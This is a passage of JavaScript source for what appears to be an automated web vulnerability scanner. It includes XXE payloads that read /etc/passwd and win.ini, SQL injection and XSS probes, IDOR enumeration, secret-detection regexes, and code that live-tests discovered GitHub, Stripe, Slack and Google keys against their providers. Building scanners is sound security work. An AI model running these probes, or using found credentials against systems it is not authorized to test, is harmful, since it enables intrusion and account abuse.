                const baseKeys = collectJsonKeys(getJson);
                const newSensitive = [...collectJsonKeys(j2)].filter((k) => !baseKeys.has(k) && SENSITIVE_KEY.test(k));
                if (newSensitive.length) {
                  findings.push(finding({
                    title: `API version downgrade exposes sensitive fields`, severity: "high", category: "api", owasp: "A01:2021 Broken Access Control",
                    description: `Older API version returns fields absent in the current version.`,
                    endpoint: downUrl, parameter: newSensitive[0], vector: "json-body", payload: `GET ${downUrl}`,
                    evidence: `GET ${new URL(downUrl).pathname} → extra sensitive keys vs v${vm[1]}: ${newSensitive.slice(0, 6).join(", ")}`,
                    exploit: "Attacker downgrades the API version to reach legacy endpoints that leak password hashes and other secrets.",
                    recommendation: "Retire insecure legacy API versions; apply the same data-exposure rules to all versions.",
                  }));
                }
              }
            } catch { /* ignore */ }
          }
        }
      } catch { /* ignore */ }
    }

    // XXE: XML body probe — external entity reads local files
    {
      const xxePayloads = [
        `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`,
      ];
      const xxeMarkers = [/\[fonts\]/i, /\[extensions\]/i, /root:.*:0:0:/, /daemon:.*:\/usr\/sbin\/nologin/];
      for (const xp of xxePayloads) {
        if (apiReqs >= API_CAP) break;
        apiReqs++;
        try {
          const r = await ftF(epUrl, {
            method: "POST",
            headers: { "Content-Type": "application/xml" },
            body: xp,
          }, 7000);
          const text = (await r.text()).replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
          if (process.env.SCAN_DEBUG) console.error(`[dbg-xxe] ${epUrl} → ${r.status} ${text.length}b markers=${xxeMarkers.map((re) => re.test(text)).join(",")}`);
          const m = xxeMarkers.find((re) => re.test(text));
          if (m) {
            findings.push(finding({
              title: `XXE (XML External Entity) at ${new URL(epUrl).pathname}`, severity: "critical", category: "xxe", owasp: "A05:2021 Security Misconfiguration",
              description: "XML parser resolves external entities — local file contents leaked in the response.",
              endpoint: epUrl, parameter: "XML body", vector: "json-body", payload: xp.slice(0, 120) + "…",
              evidence: `${"POST"} ${new URL(epUrl).pathname} → ${r.status}; file content marker '${text.match(m)?.[0]}' present in response`,
              exploit: "Attacker reads arbitrary files (web.config, .env, /etc/passwd), scans internal network via SSRF entities, or achieves RCE via PHP expect:// wrappers.",
              recommendation: "Disable external entity processing (libxml_disable_entity_loader / NOENT off); validate XML against a strict schema.",
            }));
            break;
          }
        } catch { /* ignore */ }
      }
    }

    // JSON body probes for write methods (from spec, or assume POST if GET → 405)
    let writeMethods = methods.filter((m) => ["POST", "PUT", "PATCH"].includes(m));
    if (!writeMethods.length) {
      // REST collections usually accept POST on the same URL even when only GET
      // was observed in JS — assume it whenever the endpoint looks like a real API.
      const assumePost = getStatus === 405 || getStatus === 501 || !!getJson || (!methodsKnown && getStatus === 0);
      if (assumePost) writeMethods = ["POST"];
    }
    if (!writeMethods.length || apiReqs >= API_CAP) continue;

    // build a body template from the GET response shape
    let template = null;
    if (getJson) {
      const sample = Array.isArray(getJson) ? getJson[0] : getJson;
      if (sample && typeof sample === "object" && !Array.isArray(sample)) {
        template = {};
        for (const [k, v] of Object.entries(sample)) {
          if (/^id$|pass|hash|secret/i.test(k)) continue;
          if (typeof v === "string") template[k] = "cyberhunter";
          else if (typeof v === "number") template[k] = 1;
        }
      }
    }
    if (!template || !Object.keys(template).length) template = { name: "cyberhunter", value: "cyberhunter" };
    const stringFields = Object.keys(template).filter((k) => typeof template[k] === "string").slice(0, 3);

    for (const wm of writeMethods.slice(0, 2)) {
      for (const field of stringFields) {
        for (const payload of JSON_PAYLOADS) {
          if (apiReqs >= API_CAP) break;
          const body = { ...template, [field]: payload };
          apiReqs++;
          try {
            const r = await ftF(epUrl, {
              method: wm,
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            }, 7000);
            const text = await r.text();
            const sqlHit = SQL_ERRORS.find((re) => re.test(text));
            if (sqlHit) {
              findings.push(finding({
                title: `SQL Injection in JSON body '${field}' (${new URL(epUrl).pathname})`, severity: "critical", category: "sqli", owasp: "A03:2021 Injection",
                description: `Active JSON-body probe triggered a database error on field '${field}'.`,
                endpoint: epUrl, parameter: field, vector: "json-body", payload: `${wm} ${JSON.stringify({ [field]: payload })}`,
                evidence: `${wm} ${new URL(epUrl).pathname} → ${r.status}; SQL error: ${text.match(sqlHit)?.[0]}`,
                exploit: "Attacker injects SQL through JSON API fields to extract or modify database contents.",
                recommendation: "Use parameterized queries; validate and type-check JSON input server-side.",
              }));
              continue;
            }
            // XSS: the SVG marker must come back unencoded inside JSON string values
            // (raw text.includes() would match quotes/ backslashes echoed by JSON itself)
            if (payload.includes("<svg") && jsonStringsSafeParse(text).some((s) => s.includes("cyberhunter<svg/onload=alert(1)>"))) {
              findings.push(finding({
                title: `XSS via JSON body '${field}' (${new URL(epUrl).pathname})`, severity: "high", category: "xss", owasp: "A03:2021 Injection",
                description: `JSON API reflects unencoded input in field '${field}' — exploitable if rendered in a browser.`,
                endpoint: epUrl, parameter: field, vector: "json-body", payload: `${wm} ${JSON.stringify({ [field]: payload })}`,
                evidence: `${wm} ${new URL(epUrl).pathname} → ${r.status}; payload reflected unencoded in JSON response`,
                exploit: "Attacker stores/injects script via JSON API; when an admin views the data in a browser it executes (stored/reflected XSS).",
                recommendation: "Output-encode API data wherever it is rendered; enforce a strict Content-Security-Policy.",
              }));
            }
          } catch { /* ignore */ }
        }
      }
    }
  }
}

function jsonStringsSafeParse(text) {
  try { return jsonStrings(JSON.parse(text)); } catch { return []; }
}

// ---------- numeric path-parameter probing (SQLi + IDOR-lite) ----------

async function scanPathParams({ pages, origin, ftF, log, t0, findings, finding }) {
  // collect candidate URLs: crawled pages + numeric-segment links in their HTML
  // (crawler only indexes text/html, so /users/1-style endpoints never reach `pages`)
  const candidates = new Map(); // pathname -> url
  const addCandidate = (raw, base) => {
    try {
      const u = new URL(raw, base);
      if (u.origin !== origin) return;
      u.hash = "";
      if (/\/\d{1,6}(\/|$)/.test(u.pathname)) candidates.set(u.pathname + u.search, u.toString());
    } catch { /* ignore */ }
  };
  for (const p of pages) {
    addCandidate(p.url, p.url);
    const html = p.html ?? "";
    let m;
    const linkRe = /(?:href|src|action)=["']([^"']+)["']/gi;
    while ((m = linkRe.exec(html))) addCandidate(m[1], p.url);
  }
  const targets = [...candidates.values()].slice(0, 10).map((url) => {
    const u = new URL(url);
    const segs = u.pathname.split("/");
    const segIndex = segs.findIndex((s) => /^\d{1,6}$/.test(s));
    return { url: url.split("#")[0], segIndex };
  }).filter((t) => t.segIndex > 0);
  if (!targets.length) return;
  log(`[${t0()}s] [A03] Path parameters: ${targets.length} numeric segment(s) found — probing SQLi/IDOR...`);

  for (const t of targets) {
    try {
      const u = new URL(t.url);
      const parts = u.pathname.split("/");
      const baseRes = await ftF(t.url, {}, 7000);
      const baseStatus = baseRes.status;
      const baseBody = await baseRes.text();

      // --- SQLi probes in the numeric segment ---
      for (const payload of ["'", `鎈"\\(`]) {
        const testParts = [...parts];
        testParts[t.segIndex] = encodeURIComponent(payload);
        const testUrl = origin + testParts.join("/") + u.search;
        const r = await ftF(testUrl, {}, 7000);
        const text = await r.text();
        const sqlHit = SQL_ERRORS.find((re) => re.test(text));
        if (sqlHit) {
          findings.push(finding({
            title: `SQL Injection in path parameter (${new URL(t.url).pathname})`, severity: "critical", category: "sqli", owasp: "A03:2021 Injection",
            description: "Numeric path segment is injectable — database error leaked.",
            endpoint: t.url, parameter: `path[${t.segIndex}]`, vector: "path", payload,
            evidence: `GET ${testParts.join("/")} → ${r.status}; SQL error: ${text.match(sqlHit)?.[0]}`,
            exploit: "Attacker manipulates the path ID to extract database contents or bypass access checks.",
            recommendation: "Use parameterized queries; validate path IDs as integers and enforce authorization per object.",
          }));
          break;
        }
        if (r.status >= 500 && baseStatus < 500) {
          // confirm with benign numeric value to rule out input validation
          const benignParts = [...parts];
          benignParts[t.segIndex] = "999999";
          const bRes = await ftF(origin + benignParts.join("/") + u.search, {}, 7000);
          await bRes.text();
          if (bRes.status < 500) {
            findings.push(finding({
              title: `Server error on path parameter probe (${new URL(t.url).pathname})`, severity: "medium", category: "sqli", owasp: "A03:2021 Injection",
              description: "Metacharacter payload in a numeric path segment triggers HTTP 500 while benign input does not — possible unhandled injection.",
              endpoint: t.url, parameter: `path[${t.segIndex}]`, vector: "path", payload,
              evidence: `GET ${testParts.join("/")} → ${r.status}; benign '999999' → ${bRes.status}`,
              exploit: "Attacker fuzzes path parameters to trigger errors revealing backend behavior or injection points.",
              recommendation: "Validate and cast path parameters; add global error handling that does not leak internals.",
            }));
            break;
          }
        }
      }

      // --- IDOR-lite: sibling IDs accessible without per-object authorization ---
      const n = Number(parts[t.segIndex]);
      if (Number.isInteger(n) && baseStatus === 200 && baseBody.length > 200) {
        for (const alt of [String(n + 1), "0", "999999"]) {
          if (alt === parts[t.segIndex]) continue;
          const altParts = [...parts];
          altParts[t.segIndex] = alt;
          const altUrl = origin + altParts.join("/") + u.search;
          const r2 = await ftF(altUrl, {}, 7000);
          const b2 = await r2.text();
          if (r2.status === 200 && b2.length > 200 && b2 !== baseBody) {
            findings.push(finding({
              title: `Possible IDOR on numeric path ID (${new URL(t.url).pathname})`, severity: "medium", category: "access-control", owasp: "A01:2021 Broken Access Control",
              description: `Changing path ID ${parts[t.segIndex]} → ${alt} returns different content with HTTP 200 — object-level authorization may be missing.`,
              endpoint: t.url, parameter: `path[${t.segIndex}]`, vector: "path", payload: alt,
              evidence: `GET .../${parts[t.segIndex]}/... → 200 (${baseBody.length}b); GET .../${alt}/... → 200 (${b2.length}b, different body)`,
              exploit: "Attacker enumerates numeric IDs to access other users' orders/documents (insecure direct object reference).",
              recommendation: "Enforce per-object authorization server-side; use unguessable UUIDs; verify ownership on every request.",
            }));
            break;
          }
        }
      }
    } catch { /* ignore */ }
  }
}

// ---------- exposed secrets in JS/HTML ----------
// Bug-bounty staple: source maps, inline config, and JS bundles frequently leak
// live API keys, tokens, and private keys. Scan crawled pages + same-origin
// .js/.json assets for high-confidence secret patterns.
const SECRET_PATTERNS = [
  { re: /AKIA[0-9A-Z]{16}/g, name: "AWS Access Key ID", sev: "critical" },
  { re: /ASIA[0-9A-Z]{16}/g, name: "AWS temporary Access Key", sev: "critical" },
  { re: /-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY(?: BLOCK)?-----/g, name: "Private key", sev: "critical" },
  { re: /AIza[0-9A-Za-z_\-]{35}/g, name: "Google API key", sev: "high" },
  { re: /(?:ghp|gho|ghu|ghs|ghr|github_pat)_[0-9A-Za-z_]{20,}/g, name: "GitHub token", sev: "high" },
  { re: /xox[baprs]-[0-9A-Za-z-]{10,}/g, name: "Slack token", sev: "high" },
  { re: /(?:sk|rk)_(?:live|test)_[0-9A-Za-z]{16,}/g, name: "Stripe secret key", sev: "critical" },
  { re: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}/g, name: "JWT", sev: "medium" },
  { re: /(?:api[_-]?key|api[_-]?secret|secret[_-]?key|access[_-]?token|auth[_-]?token|client[_-]?secret)["'`\s]*[:=]["'`\s]*["'`]([A-Za-z0-9/+_.=-]{20,})["'`]/gi, name: "Hardcoded credential", sev: "high", group: 1 },
];

// Live-verify an exposed secret against its provider API (read-only checks).
// Returns a short verdict string, or null when the type can't be verified.
async function verifySecret(name, secret) {
  const t = AbortSignal.timeout(8000);
  try {
    if (/GitHub token/i.test(name)) {
      const r = await fetch("https://api.github.com/user", {
        headers: { Authorization: `Bearer ${secret}`, "User-Agent": "cyberhunter-ai", Accept: "application/vnd.github+json" },
        signal: t,
      });
      if (r.ok) { const j = await r.json(); return `VALID — authenticates as GitHub user '${j.login}'`; }
      return `invalid/expired (HTTP ${r.status})`;
    }
    if (/Google API key/i.test(name)) {
      const r = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${secret}`, { signal: t });
      const j = await r.json().catch(() => ({}));
      return j.status === "OK" ? "VALID — Geocoding API calls succeed (billable quota abuse possible)" : `restricted or invalid (${j.status ?? r.status})`;
    }
    if (/Stripe secret/i.test(name)) {
      const r = await fetch("https://api.stripe.com/v1/balance", { headers: { Authorization: `Bearer ${secret}` }, signal: t });
      return r.ok ? "VALID — Stripe account balance readable" : `invalid (${r.status})`;
    }
    if (/Slack token/i.test(name)) {
      const r = await fetch("https://slack.com/api/auth.test", { method: "POST", headers: { Authorization: `Bearer ${secret}` }, signal: t });
      const j = await r.json().catch(() => ({}));
      return j.ok ? `VALID — Slack workspace '${j.team}' as '${j.user}'` : `invalid (${j.error ?? r.status})`;
    }
    if (/AWS/i.test(name)) {
      return "verify manually — requires SigV4 signed request (sts:GetCallerIdentity)";
    }
    if (name === "JWT") {
      try {
        const p = JSON.parse(Buffer.from(secret.split(".")[1] ?? "", "base64url").toString());
        const exp = p.exp ? new Date(p.exp * 1000).toISOString().slice(0, 10) : "no-exp";
        return `decoded — sub:'${p.sub ?? "-"}' role:'${p.role ?? p.scope ?? "-"}' exp:${exp} — test signature/alg:none acceptance`;
      } catch { return "payload undecodable"; }
    }
    return null;
  } catch (e) {
    return `verify failed: ${e.message}`;
  }
}

async function scanExposedSecrets(pages, origin, ftF, log, t0, findings, finding) {
  // gather HTML + same-origin JS/JSON asset URLs
  const assets = new Set();
  for (const p of pages ?? []) {
    const html = p.html ?? "";
    for (const m of html.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)) {
      try { const u = new URL(m[1], p.url); if (u.origin === origin) assets.add(u.toString()); } catch { /* ignore */ }
    }
    for (const m of html.matchAll(/<link[^>]+href=["']([^"']+\.(?:json|map))["']/gi)) {
      try { const u = new URL(m[1], p.url); if (u.origin === origin) assets.add(u.toString()); } catch { /* ignore */ }
    }
  }
  const docs = (pages ?? []).map((p) => ({ url: p.url, text: p.html ?? "" }));
  for (const a of [...assets].slice(0, 12)) {
    try {
      const r = await ftF(a, {}, 8000);
      const ctype = r.headers.get("content-type") ?? "";
      if (!/javascript|json|text|octet-stream/i.test(ctype)) continue;
      docs.push({ url: a, text: await r.text() });
    } catch { /* skip */ }
  }
  const seen = new Set();
  for (const doc of docs) {
    for (const sp of SECRET_PATTERNS) {
      sp.re.lastIndex = 0;
      let m;
      while ((m = sp.re.exec(doc.text))) {
        const secret = m[sp.group ?? 0] ?? m[0];
        // Heuristic: secrets inside <pre>/<code> documentation examples are
        // usually sample data, not real credentials — downgrade to info.
        const before = doc.text.slice(Math.max(0, m.index - 400), m.index);
        const inPre = (before.match(/<pre[\s>]/gi) ?? []).length > (before.match(/<\/pre>/gi) ?? []).length;
        const docLike = /\/(docs|doc|documentation|reference|examples|sample|demo)\//i.test(new URL(doc.url).pathname);
        const isExample = inPre || docLike;
        const key = `${sp.name}:${secret.slice(0, 12)}`;
        if (seen.has(key)) continue;
        seen.add(key);
        const masked = secret.length > 10 ? `${secret.slice(0, 6)}…${secret.slice(-4)}` : "***";
        const ver = isExample ? null : await verifySecret(sp.name, secret);
        findings.push(finding({
          title: `Exposed ${sp.name} in client-side code (${new URL(doc.url).pathname})${isExample ? " — likely documentation example" : ""}`,
          severity: isExample ? "info" : sp.sev === "critical" ? "critical" : sp.sev === "high" ? "high" : "medium",
          category: "exposure", owasp: "A02:2021 Cryptographic Failures",
          description: `A ${sp.name.toLowerCase()} is hardcoded in publicly served JavaScript/HTML — anyone can extract and abuse it.`,
          endpoint: doc.url, parameter: "N/A", vector: "static-asset",
          payload: secret,
          evidence: `${new URL(doc.url).pathname} contains ${sp.name}: ${masked}${isExample ? " — inside documentation/example block, likely sample data" : ""}${ver ? ` — live verification: ${ver}` : ""}`,
          exploit: sp.name.includes("AWS") || sp.name.includes("Stripe") || sp.name.includes("Private")
            ? "Attacker extracts the key and uses it directly — cloud API access, payment charges, or server impersonation."
            : "Attacker extracts the credential and uses it to access the associated service/account.",
          recommendation: isExample
            ? "Likely a documentation example — verify manually whether the credential is real before reporting; if real, rotate immediately."
            : "Remove secrets from client-side code; rotate the exposed credential immediately; move secrets server-side.",
        }));
        log(`[${t0()}s] [!] Exposed ${sp.name} found in ${doc.url}`);
        break; // one finding per pattern per document is enough
      }
    }
  }
}

// ---------- subdomain takeover ----------
// Classic bug-bounty check: a subdomain CNAME'd to a deprovisioned SaaS
// (GitHub Pages, Heroku, Azure, S3, ...) can be claimed by an attacker.
const TAKEOVER_PROVIDERS = [
  { cname: /github\.io$/i, body: /there isn't a github pages site|for root url.*returned 404|project site not found/i, name: "GitHub Pages" },
  { cname: /herokuapp\.com$|herokudns\.com$/i, body: /no such app|herokucdn\.com\/error-pages\/404/i, name: "Heroku" },
  { cname: /azurewebsites\.net$|cloudapp\.net$|trafficmanager\.net$/i, body: /404 web site not found|the resource you are looking for has been removed/i, name: "Azure" },
  { cname: /amazonaws\.com$|s3[.-].*amazonaws\.com$/i, body: /nosuchbucket|the specified bucket does not exist/i, name: "AWS S3" },
  { cname: /netlify\.app$|netlify\.com$/i, body: /not found - request id|page not found/i, name: "Netlify" },
  { cname: /vercel\.app$|now\.sh$/i, body: /deployment not found|the deployment could not be found/i, name: "Vercel" },
  { cname: /surge\.sh$/i, body: /project not found/i, name: "Surge" },
  { cname: /bitbucket\.io$/i, body: /repository not found/i, name: "Bitbucket" },
  { cname: /wpengine\.com$|wpenginepowered\.com$/i, body: /has been archived|domain is not configured/i, name: "WP Engine" },
  { cname: /zendesk\.com$|freshdesk\.com$/i, body: /help center closed|no helpdesk/i, name: "Zendesk/Freshdesk" },
  { cname: /statuspage\.io$/i, body: /page not found|this status page/i, name: "Statuspage" },
  { cname: /helpjuice\.com$/i, body: /knowledge base not found/i, name: "Helpjuice" },
  { cname: /ghost\.io$|ghost\.org$/i, body: /site unavailable|thing was not found/i, name: "Ghost" },
];

async function checkSubdomainTakeover(hosts, ftF, log, t0, findings, finding) {
  for (const host of (hosts ?? []).slice(0, 40)) {
    try {
      const cnames = await dns.resolveCname(host).catch(() => []);
      const cname = cnames[0] ?? "";
      const prov = TAKEOVER_PROVIDERS.find((p) => p.cname.test(cname));
      if (!prov) continue;
      // CNAME points at a takeover-prone provider — check if it's unclaimed
      for (const scheme of ["https", "http"]) {
        try {
          const r = await ftF(`${scheme}://${host}/`, {}, 8000);
          const body = await r.text();
          if (prov.body.test(body)) {
            findings.push(finding({
              title: `Possible subdomain takeover: ${host} → ${prov.name}`,
              severity: "high", category: "takeover", owasp: "A05:2021 Security Misconfiguration",
              description: `${host} CNAMEs to ${cname} (${prov.name}) and the service returns its "unclaimed" page — an attacker may be able to register the resource and serve content on this subdomain.`,
              endpoint: `${scheme}://${host}/`, parameter: "N/A", vector: "dns",
              payload: "N/A — passive observation",
              evidence: `CNAME ${host} → ${cname}; GET / → ${r.status}, body matches ${prov.name} unclaimed fingerprint`,
              exploit: "Attacker claims the dangling SaaS resource → serves phishing/malware under a trusted *.target.com subdomain, steals cookies scoped to the parent domain.",
              recommendation: "Remove the stale DNS record or reclaim the SaaS resource; audit all CNAMEs pointing to third-party services.",
            }));
            log(`[${t0()}s] [!] Possible subdomain takeover: ${host} → ${cname}`);
            break;
          }
        } catch { /* try next scheme */ }
      }
    } catch { /* DNS failure — skip */ }
  }
}

// ---------- GraphQL surface ----------
// Discovers GraphQL endpoints (links/JS references + common paths) and tests
// whether introspection is enabled — an enabled schema hands attackers the
// full API map (queries, mutations, types) for free.
async function scanGraphQL({ pages, origin, ftF, log, t0, findings, finding }) {
  const endpoints = new Map(); // url -> true
  const add = (raw) => {
    try {
      const u = new URL(raw, origin);
      if (u.origin !== origin) return;
      u.hash = "";
      if (/graphql|\/gql(\/|$)|\/query(\/|$)/i.test(u.pathname)) endpoints.set(u.toString(), true);
    } catch { /* ignore */ }
  };
  for (const p of pages ?? []) {
    const html = p.html ?? "";
    for (const m of html.matchAll(/["'`](\/[^"'`\s]*graphql[^"'`\s]*)["'`]/gi)) add(m[1]);
    for (const m of html.matchAll(/["'`](https?:\/\/[^"'`\s]*graphql[^"'`\s]*)["'`]/gi)) add(m[1]);
  }
  // common mount points worth one probe each
  for (const path of ["/graphql", "/api/graphql", "/gql", "/v1/graphql"]) {
    try { endpoints.set(new URL(path, origin).toString(), true); } catch { /* ignore */ }
  }
  if (!endpoints.size) return;

  const INTROSPECTION = { query: "{__schema{queryType{name}mutationType{name}types{name kind}}}" };
  let reqs = 0;
  for (const ep of endpoints.keys()) {
    if (reqs >= 12) break;
    reqs++;
    try {
      const r = await ftF(ep, {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify(INTROSPECTION),
      }, 8000);
      const text = await r.text();
      let data = null;
      try { data = JSON.parse(text); } catch { /* not JSON */ }
      const schema = data?.data?.__schema;
      if (schema?.types?.length) {
        const typeNames = schema.types.map((t) => t.name).filter(Boolean);
        const queries = schema.types.find((t) => t.name === schema.queryType?.name);
        findings.push(finding({
          title: `GraphQL introspection enabled (${new URL(ep).pathname})`,
          severity: "low", category: "api", owasp: "A05:2021 Security Misconfiguration",
          description: `GraphQL endpoint exposes full schema introspection — ${typeNames.length} types visible including ${schema.queryType?.name ?? "queries"}${schema.mutationType ? ` and ${schema.mutationType.name} mutations` : ""}. Attackers get a complete API map for free.`,
          endpoint: ep, parameter: "query", vector: "graphql",
          payload: JSON.stringify(INTROSPECTION).slice(0, 300),
          evidence: `POST ${new URL(ep).pathname} → ${r.status}; introspection returned ${typeNames.length} types: ${typeNames.slice(0, 15).join(", ")}${typeNames.length > 15 ? "…" : ""}`,
          exploit: "Attacker downloads the schema, discovers hidden mutations/queries (e.g. deleteUser, adminDebug), then probes each for authz/ injection flaws.",
          recommendation: "Disable introspection in production (__schema should return an error); enforce depth/complexity limits and auth on the endpoint.",
        }));
        log(`[${t0()}s] [!] GraphQL introspection OPEN at ${ep} (${typeNames.length} types)`);
      } else if (/graphql/i.test(text) && /errors?/i.test(text) && r.status === 200) {
        // endpoint exists but introspection blocked — note it as info-level surface
        log(`[${t0()}s] [A03] GraphQL endpoint found at ${ep} (introspection disabled)`);
      }
    } catch { /* endpoint may not exist */ }
  }
}

// ---------- authentication ----------

async function resolveAuth(auth, pageUrl, log, t0) {
  if (!auth) return {};
  if (auth.cookie && auth.cookie.trim()) {
    log(`[${t0()}s] [AUTH] Using provided session cookie`);
    let cookieStr = auth.cookie.trim();
    // DVWA-style apps gate challenge difficulty behind a 'security' cookie —
    // honor an explicit level just like the auto-login flow does.
    if (auth.securityLevel && !/security=/i.test(cookieStr)) {
      cookieStr += `; security=${auth.securityLevel}`;
    }
    return { Cookie: cookieStr };
  }
  if (!auth.loginUrl || !auth.username) return {};
  try {
    const loginUrl = new URL(auth.loginUrl, pageUrl.origin).toString();
    log(`[${t0()}s] [AUTH] Attempting login at ${loginUrl} as '${auth.username}'...`);

    // GET login page → harvest hidden fields (CSRF tokens etc.)
    // also capture session cookie set by the GET so POST shares the same session
    const page = await fetchT(loginUrl);
    const html = await page.text();
    const getCookieHeaders = page.headers.getSetCookie?.() ?? [];
    // cookie jar: name → "k=v", updated by every Set-Cookie (last wins).
    // DVWA sends PHPSESSID twice on GET and regenerates it on login — a stale
    // value from an earlier response must never overwrite the newest one.
    const jar = new Map();
    const absorb = (headers) => {
      for (const c of headers ?? []) {
        const pair = c.split(";")[0];
        const name = pair.split("=")[0].trim();
        if (name) jar.set(name, pair);
      }
    };
    const jarStr = () => [...jar.values()].join("; ");
    absorb(getCookieHeaders);
    const getCookies = jarStr();
    const fields = {};
    const inRe = /<input[^>]*>/gi;
    let m;
    while ((m = inRe.exec(html))) {
      const tag = m[0];
      const name = /name=["']([^"']+)["']/i.exec(tag)?.[1];
      const val = /value=["']([^"']*)["']/i.exec(tag)?.[1] ?? "";
      const type = (/type=["']([^"']+)["']/i.exec(tag)?.[1] ?? "text").toLowerCase();
      if (name && (type === "hidden" || type === "submit")) fields[name] = val || name;
    }

    // Auto-detect credential field names when not explicitly provided —
    // works for arbitrary login forms, not just DVWA's username/password.
    let userField = auth.usernameField;
    let passField = auth.passwordField;
    if (!userField || !passField) {
      const allInputs = [...html.matchAll(/<input[^>]*>/gi)].map((x) => x[0]);
      if (!passField) {
        const passInput = allInputs.find((t) => /type=["']?password/i.test(t));
        passField = passInput ? (/name=["']([^"']+)["']/i.exec(passInput)?.[1]) : undefined;
      }
      if (!userField) {
        const userInput = allInputs.find((t) => {
          const ty = (/type=["']([^"']+)["']/i.exec(t)?.[1] ?? "text").toLowerCase();
          return !/hidden|submit|button|checkbox|radio|password|file|image|reset/i.test(ty) && /name=["']([^"']+)["']/i.test(t);
        });
        userField = userInput ? (/name=["']([^"']+)["']/i.exec(userInput)?.[1]) : undefined;
      }
      if (userField || passField) {
        log(`[${t0()}s] [AUTH] Auto-detected login fields: user='${userField ?? "?"}' pass='${passField ?? "?"}'`);
      }
    }

    fields[userField || "username"] = auth.username;
    fields[passField || "password"] = auth.password;

    const res = await fetchT(loginUrl, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded", ...(getCookies ? { Cookie: getCookies } : {}) },
      body: new URLSearchParams(fields).toString(),
      redirect: "manual",
    });

    const postBody = await res.text().catch(() => "");
    absorb(res.headers.getSetCookie?.() ?? []);
    const loc = res.headers.get("location");
    let locPath = "";
    if (loc) { try { locPath = new URL(loc, loginUrl).pathname; } catch { locPath = loc; } }
    const redirectedAway = !!loc && !/login|logout|signin/i.test(locPath);
    if (loc && [301, 302, 303, 307].includes(res.status)) {
      try {
        // follow the post-login redirect with the NEWEST cookies (the
        // authenticated session) — using the pre-login cookie here would
        // overwrite the good session id with the old one
        const r2 = await fetchT(new URL(loc, loginUrl).toString(), {
          redirect: "manual",
          headers: jarStr() ? { Cookie: jarStr() } : {},
        });
        absorb(r2.headers.getSetCookie?.() ?? []);
      } catch { /* ignore */ }
    }

    // detect obvious login failure: error text AND no redirect away from login
    const failed = /incorrect|invalid|failed|salah|wrong|tidak/i.test(postBody) && !redirectedAway;
    if (failed) {
      log(`[${t0()}s] [AUTH] Login FAILED — server returned error message. Check credentials/login URL.`);
      return {};
    }

    if (jar.size === 0 && !redirectedAway) {
      log(`[${t0()}s] [AUTH] Login failed — no session cookie returned and no redirect (check credentials/login URL)`);
      return {};
    }
    if (redirectedAway) {
      log(`[${t0()}s] [AUTH] Login accepted — redirected to ${locPath}`);
    }

    // DVWA defaults to 'impossible' when no security cookie is sent — if the
    // target is DVWA and no level was chosen, fall back to 'low' so the active
    // probes can actually reach the vulnerable code paths.
    if (!auth.securityLevel) {
      try {
        const secProbeUrl = new URL("security.php", loginUrl).toString();
        const secProbe = await fetchT(secProbeUrl, { headers: { Cookie: jarStr() } });
        const secProbeHtml = await secProbe.text();
        absorb(secProbe.headers.getSetCookie?.() ?? []);
        if (/seclev_submit|name=["']security["']/i.test(secProbeHtml)) {
          auth.securityLevel = "low";
          log(`[${t0()}s] [AUTH] DVWA detected without a security level — defaulting to 'low' (DVWA's own default is 'impossible', which hides all vulns)`);
        }
      } catch { /* not DVWA — continue without a level */ }
    }

    // DVWA helper: set security level — security.php also requires a fresh
    // user_token (CSRF), so harvest hidden inputs from the page first
    if (auth.securityLevel) {
      try {
        const secUrl = auth.securityUrl || new URL("security.php", loginUrl).toString();
        const curCookie = jarStr();
        const secPage = await fetchT(secUrl, { headers: { Cookie: curCookie } });
        const secHtml = await secPage.text();
        absorb(secPage.headers.getSetCookie?.() ?? []);
        const secFields = extractHiddenInputs(secHtml);
        const sr = await fetchT(secUrl, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded", Cookie: jarStr() },
          body: new URLSearchParams({ ...secFields, security: auth.securityLevel, seclev_submit: "Submit" }).toString(),
          redirect: "manual",
        });
        const secCookies = sr.headers.getSetCookie?.() ?? [];
        absorb(secCookies);
        const applied = secCookies.some((c) => new RegExp(`^security=${auth.securityLevel}`, "i").test(c.split(";")[0]));
        log(applied
          ? `[${t0()}s] [AUTH] Security level set to '${auth.securityLevel}'`
          : `[${t0()}s] [AUTH] WARNING: security level '${auth.securityLevel}' may not have applied (no Set-Cookie)`);
      } catch { /* non-fatal */ }
    }
    // final cookie string from the jar (newest value per name wins)
    let cookieStr = jarStr();
    // ensure security level is present even if server didn't Set-Cookie it
    if (auth.securityLevel && !/security=/i.test(cookieStr)) {
      cookieStr += `; security=${auth.securityLevel}`;
    }
    log(`[${t0()}s] [AUTH] Login OK — ${jar.size} session cookie(s) acquired; all requests will be authenticated`);
    return { Cookie: cookieStr };
  } catch (e) {
    log(`[${t0()}s] [AUTH] Login error: ${e.message}`);
    return {};
  }
}

// ---------- main scan ----------

class ScanCancelled extends Error {
  constructor() { super("Scan cancelled by user."); this.name = "ScanCancelled"; }
}

export async function scanTarget(input, opts = {}, log = () => {}) {
  // opts.out collects live state so a cancelled scan can return partial results
  const out = (opts.out ??= { findings: [], testedParams: new Set() });
  out.started = Date.now();
  try {
    return await scanTargetInner(input, opts, log);
  } catch (e) {
    if (e?.name === "ScanCancelled" || opts.isCancelled?.()) {
      const f = out.findings ?? [];
      const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
      f.sort((a, b) => (order[a.severity] ?? 9) - (order[b.severity] ?? 9));
      const count = (s) => f.filter((x) => x.severity === s).length;
      return {
        ok: true, cancelled: true,
        mode: opts.mode === "passive" ? "passive" : "active",
        authenticated: !!(opts.auth?.cookie || opts.auth?.loginUrl),
        target: String(input),
        status: out.status ?? 0,
        elapsed_ms: Date.now() - (out.started ?? Date.now()),
        pages_crawled: out.pages ?? 0,
